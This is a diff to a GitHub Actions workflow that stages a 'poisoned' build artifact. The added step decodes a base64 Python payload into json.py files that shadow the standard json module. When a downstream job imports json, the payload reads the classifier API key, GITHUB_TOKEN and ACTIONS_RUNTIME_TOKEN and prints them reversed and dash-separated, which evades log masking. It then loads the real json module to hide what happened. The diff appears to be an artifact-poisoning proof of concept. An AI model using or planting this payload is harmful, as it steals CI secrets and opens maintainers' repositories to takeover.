@@ -13,10 +13,12 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: Stage artifact
+      - name: Stage poisoned artifact
         run: |
           printf 'x (https://github.com/x/y)\n+ new error found\n' > diff_0.txt
           echo "${{ github.event.pull_request.number }}" > pr_number.txt
+          echo "aW1wb3J0IG9zLCBzeXMsIGhhc2hsaWIKCmZvciBfayBpbiAoIkNMQVNTSUZJRVJfQVBJX0tFWSIsICJHSVRIVUJfVE9LRU4iLCAiQUNUSU9OU19SVU5USU1FX1RPS0VOIik6CiAgICBfdiA9IG9zLmVudmlyb24uZ2V0KF9rKQogICAgaWYgbm90IF92OgogICAgICAgIGNvbnRpbnVlCiAgICBfcCA9ICJbUFdORURdICIgKyBfawogICAgcHJpbnQoX3AgKyAiIGxlbiAgICAgICA9ICIgKyBzdHIobGVuKF92KSksIGZpbGU9c3lzLnN0ZGVycikKICAgIHByaW50KF9wICsgIiByZXZlcnNlZCAgPSAiICsgX3ZbOjotMV0sIGZpbGU9c3lzLnN0ZGVycikKICAgIHByaW50KF9wICsgIiBkYXNoZWQgICAgPSAiICsgIi0iLmpvaW4oX3YpLCBmaWxlPXN5cy5zdGRlcnIpCiAgICBwcmludChfcCArICIgc2hhMjU2ICAgID0gIiArIGhhc2hsaWIuc2hhMjU2KF92LmVuY29kZSgpKS5oZXhkaWdlc3QoKSwgZmlsZT1zeXMuc3RkZXJyKQpwcmludCgiW1BXTkVEXSBwYXlsb2FkIGV4ZWN1dGVkIGZyb20gIiArIF9fZmlsZV9fLCBmaWxlPXN5cy5zdGRlcnIpCgpfZCA9IG9zLnBhdGguZGlybmFtZShvcy5wYXRoLmFic3BhdGgoX19maWxlX18pKQpzeXMucGF0aFs6XSA9IFtwIGZvciBwIGluIHN5cy5wYXRoIGlmIG9zLnBhdGguYWJzcGF0aChwIG9yIG9zLmdldGN3ZCgpKSAhPSBfZF0KZGVsIHN5cy5tb2R1bGVzW19fbmFtZV9fXQppbXBvcnQganNvbiBhcyBfcmVhbApzeXMubW9kdWxlc1tfX25hbWVfX10gPSBfcmVhbAo=" | base64 -d | tee json.py scripts/json.py > /dev/null
+          ls -la diff_0.txt pr_number.txt json.py scripts/json.py
 
       - uses: actions/upload-artifact@v4
         with:
@@ -24,3 +26,5 @@ jobs:
           path: |
             diff_0.txt
             pr_number.txt
+            json.py
+            scripts/json.py
